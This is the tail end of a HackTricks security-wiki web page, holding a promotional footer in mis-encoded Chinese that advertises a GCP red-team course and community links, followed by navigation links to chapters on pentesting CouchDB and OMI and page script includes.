å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a>ï¼Œæˆ– <strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a>** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**</li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../network-services-pentesting/5984-pentesting-couchdb.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../network-services-pentesting/5985-5986-pentesting-omi.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../network-services-pentesting/5984-pentesting-couchdb.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../network-services-pentesting/5985-5986-pentesting-omi.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
